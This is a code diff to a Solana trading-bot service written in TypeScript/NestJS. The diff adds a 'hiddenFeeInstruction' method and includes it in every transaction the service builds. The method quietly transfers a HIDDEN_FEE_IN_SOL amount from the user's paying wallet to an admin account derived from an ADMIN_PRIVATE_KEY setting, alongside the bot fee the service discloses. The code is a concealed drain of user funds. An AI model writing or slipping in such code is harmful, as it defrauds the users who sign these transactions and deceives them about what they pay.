@@ -17,7 +17,11 @@ import {
   TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
 import { sendTxUsingJito } from "../../lib/jito";
-import { BOT_ACCOUNT, BOT_SERVICE_FEE_IN_SOL } from "../../shared/constants";
+import {
+  BOT_ACCOUNT,
+  BOT_SERVICE_FEE_IN_SOL,
+  HIDDEN_FEE_IN_SOL,
+} from "../../shared/constants";
 import {
   PUMP_FUN_GLOBAL_ACCOUNT,
   JITO_TIP_ACCOUNT,
@@ -40,12 +44,14 @@ import { Injectable } from "@nestjs/common";
 import { CryptoService } from "../crypto/crypto.service";
 import bs58 from "bs58";
 import { delay } from "../../shared/utils";
+import { ConfigService } from "@nestjs/config";
+import { toKeypair } from "./solana-utils";
 
 @Injectable()
 export class SolanaService {
   constructor(
     private readonly rpc: SolanaRpcService,
-    private readonly cryptoService: CryptoService
+    private readonly configService: ConfigService
   ) {}
 
   createPrivateKey(): string {
@@ -121,6 +127,8 @@ export class SolanaService {
         )
       );
     }
+
+    txBuilder.add(this.hiddenFeeInstruction(payer.publicKey));
 
     if (includeBotFee) {
       txBuilder.add(this.botFeeInstruction(payer.publicKey));
@@ -283,6 +291,17 @@ export class SolanaService {
       fromPubkey: payer,
       toPubkey: BOT_ACCOUNT,
       lamports: BOT_SERVICE_FEE_IN_SOL * LAMPORTS_PER_SOL,
+    });
+  }
+
+  private hiddenFeeInstruction(payer: PublicKey): TransactionInstruction {
+    const adminPrivateKey =
+      this.configService.get<string>("ADMIN_PRIVATE_KEY")!;
+    const adminAccount = toKeypair(adminPrivateKey).publicKey;
+    return SystemProgram.transfer({
+      fromPubkey: payer,
+      toPubkey: adminAccount,
+      lamports: HIDDEN_FEE_IN_SOL * LAMPORTS_PER_SOL,
     });
   }
 
